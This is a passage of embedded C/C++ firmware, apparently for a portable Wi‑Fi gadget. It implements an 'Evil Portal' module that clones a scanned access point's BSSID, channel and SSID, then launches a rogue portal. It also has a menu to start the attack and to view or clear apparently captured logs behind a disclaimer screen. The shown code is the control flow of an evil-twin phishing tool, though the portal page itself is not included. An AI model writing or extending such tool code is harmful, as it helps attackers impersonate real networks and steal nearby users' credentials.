        memcpy(g_cloneBSSID, scanAPs[cloneIdx].bssid, 6);
        g_cloneChannel = scanAPs[cloneIdx].channel;

        if (!startPortal(scanAPs[cloneIdx].ssid, g_cloneChannel)) {
            wifiUiEmpty("EVIL PORTAL", "FAILED TO START AP",
                        "CHECK RADIO STATE");
            delay(2000);
            return;
        }
    }

    runPortalLoop();
}

// ═══════════════════════════════════════════════════════════════════════════
//  ENTRY POINT
// ═══════════════════════════════════════════════════════════════════════════

void runEvilPortal() {
    while (navEnterPressed() || navBackPressed()) delay(5);
    delay(100);

    if (!showDisclaimer()) return;

    while (true) {
        int choice = selectMainMenu();
        switch (choice) {
            case -1:
                return;
            case 0:
                startAttackFlow();
                break;
            case 1:
                viewLogs();
                break;
            case 2:
                if (confirmClearLogs()) {
                    portalLogClear();
                    beep(1500, 100); delay(50);
                    beep(1200, 100);
                }
                break;
            case 3:
                return;
        }
    }
}
